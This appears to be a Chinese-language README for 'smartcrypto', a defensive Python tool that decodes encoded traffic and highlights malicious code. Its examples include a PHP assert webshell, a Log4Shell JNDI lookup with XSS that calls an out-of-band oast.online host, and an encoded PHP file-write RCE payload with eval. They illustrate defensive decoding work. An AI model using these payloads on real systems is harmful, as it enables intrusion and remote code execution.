# smartcrypto_v1.0
一键报文解码，HVV，蓝队防守利器
一键式多功能加解密工具，具有以下特点：

1.无需繁琐判断，一键常用全编码解密。

2.自动识别需解密部分。

3.用户可自定义的恶意代码高亮显示。

4.大小写混淆识别。

5.对ICMP、UDP报文的解析。

6.Windows、Linux、Mac跨平台使用，仅需python3环境。

7.工具小巧且功能强大，仅3.4MB。

8.代码开源，安全可靠。

9.二维码生成功能。
 <img width="901" alt="图片1" src="https://github.com/user-attachments/assets/25da5a37-4f00-4f15-a3d1-cf0533112e18">
工具运行：

python 软件安装目录\smartcrypto.py

<img width="484" alt="图片2" src="https://github.com/user-attachments/assets/0442ecf7-fc83-44d1-92a2-5ec712ca2420">


1.一键常用全编码解密：用户无需判断，系统自动尝试所有可用方法进行解密。配合完善的报错机制，帮助用户快速锁定正确的解密方式。

例：

https%3A%2F%2Fwww.example.com%2Fabout%3Fuser%3Djohn%20doe


<img width="416" alt="image" src="https://github.com/user-attachments/assets/3aec0fc4-cab3-4b92-abcd-a2a26dd2ce20">



2.自动识别需解密部分：使用正则表达式自动检测并解密文本中的编码片段。

例：

https://example.com/api?data=ZGF0YSt3aXRoL3NwZWNpYWw/Y2hhcnMmaW49aXQ=

<img width="415" alt="image" src="https://github.com/user-attachments/assets/3288452b-5dfc-4361-a01b-c3b982b5a2be">


3.用户可自定义的恶意代码高亮显示：用户可以在value.txt文件中添加关键词，使用户拥有自己的恶意代码识别库。系统会在输出结果中高亮显示这些关键词，帮助用户快速识别潜在威胁。

例：

<?php

$a=base64_decode("YXNzZXJ0");

@a($_POST['shell']);

?>
<img width="415" alt="image" src="https://github.com/user-attachments/assets/f84e2de5-2e9a-41ae-8ce7-d63b46fd6b04">



4.大小写混淆识别：通过正则搜索，增强了对常见绕过安全防护技术的识别能力。

例：

GET /_404_%3E%3Cscript%3EAlERt(1337)%3C%2Fscript%3E useragent: ${jndi:ldap://127.0.0.1#.${hostName}.useragent.cr3fnhsgvalhkg6trek0mktqo1urhqifi.oast.online} ///../app.js

<img width="415" alt="image" src="https://github.com/user-attachments/assets/c3592b21-b44f-46a0-8695-5beccfdacfae">


帮助用户一键快速解密，并迅速锁定威胁代码。

5.对ICMP、UDP报文的解析：能够解析并展示HEX DUMP数据，提供详细的网络协议头部信息（如以太网、IP、ICMP、UDP等）。

例1.ICMP ping包：

00000000: 00 60 8C D9 72 3B 00 1C 23 4B C1 22 08 00 45 00  .`..r;..#K."..E.

00000010: 00 54 1C 46 40 00 40 01 F6 C2 C0 A8 00 68 C0 A8  .T.F@.@......h..

00000020: 00 01 08 00 07 56 00 01 00 4D 61 62 63 64 65 66  .....V...Mabcdef

00000030: 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76  ghijklmnopqrstuv

00000040: 77 78 79 7A 00 00 00 00 00 00 00 00 00 00        wxyz............

<img width="415" alt="image" src="https://github.com/user-attachments/assets/8d2fe258-d913-4fdb-8e69-2fa08944d0e4">


例2.UDP DNS查询报文：

00000000: 00 1A A0 9B C3 12 00 1B 21 7B D4 F1 08 00 45 00  ......!.{....E.

00000010: 00 32 4A 1C 00 00 80 11 B7 E4 C0 A8 01 0A C0 A8  .2J.............

00000020: 01 01 1F 90 00 35 00 1E 5C A2 00 01 01 00 00 01  .....5..\.......

00000030: 00 00 00 00 00 00 03 77 77 77 07 65 78 61 6D 70  .......www.exam

00000040: 6C 65 03 63 6F 6D 00 00 01 00 01                ple.com.....

<img width="415" alt="image" src="https://github.com/user-attachments/assets/df6f6607-81ee-4394-977a-e53d976ae0d0">


6.Windows、Linux、Mac跨平台使用，仅需python3环境。

7.工具小巧且功能强大，仅3.4MB。
<img width="194" alt="image" src="https://github.com/user-attachments/assets/7847c465-cbfd-460a-95cd-4206c048d3d3">

8.代码开源，安全可靠。

9.二维码生成功能：

在输入框输入代码或其他内容，点击生成二维码。

方便在某些无网络的情况下传递数据。

也可以当成一个有趣的工具，逗女朋友开心^_^。

10.复杂的组合操作：

例：

1[]=xmykh.php&1[]=N3BuZGVhPD9waHAgY2xhc3MgR2FNMTBmQTUgeyBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJEg3bXU2KXsgQGV2YWwoIi8qWkc1emtuUmZTayovIi4kSDdtdTYuIiIpOyB9fW5ldyBHYU0xMGZBNSgkX1JFUVVFU1RbJ00nXSk7Pz4%3D&2=$a,$b&3=return var_dump(file_put_contents($b,base64_decode($a)));

<img width="416" alt="image" src="https://github.com/user-attachments/assets/cef28d0d-7b32-4f14-b393-8a675960edf4">


说明他是经过URL+BASE64加密的。

把URL解密的结果复制，粘贴到输入框二次解密。

<img width="415" alt="image" src="https://github.com/user-attachments/assets/297fbed8-d39f-4a23-9ae6-dc0776d28d66">


这时BASE64和URL安全BASE64都解出来了，对比两者。

BASE64:

<img width="415" alt="image" src="https://github.com/user-attachments/assets/d38d0ed8-fa67-447f-b7dc-f93753149b62">

URL安全BASE64：

<img width="415" alt="image" src="https://github.com/user-attachments/assets/05f441f0-4081-4c50-9f18-8695a86b3ea1">

明显可以看到BASE64有一段解密错误。

说明黑客是用URL安全BASE64加密的。

通过URL+URL安全BASE64组合解密，我们明显可以看出这是远程代码执行（RCE）。

11.另外，还有一些符合用户使用习惯的小功能，例如：

l双击对应输出框，会自动跳转到详细视图界面，有更大的输出框，方便用户查看解密结果。

l单击解密，会自动跳转到输出框，方便用户查看全局解密情况。

l完善的复制粘贴功能，可以用快捷键，可以右键菜单，也可以点击用户界面的按钮。

l一键清空功能，节约用户时间。

l左下角状态栏功能，让用户知道“smartcrypto”时刻在忠实执行你的命令。

  通过这些功能，工具帮助用户轻松进行各类加解密操作，提高了工作效率，并增强了数据分析和网络安全检测的能力。即使对编程和网络安全知识了解不多，也能通过这个工具轻松进行相关操作。

联系与支持

本工具会一直维护，如需要开发什么新的实用功能或建议，请联系开发者：

邮箱：dreamblade123@163.com

微信：allen886611
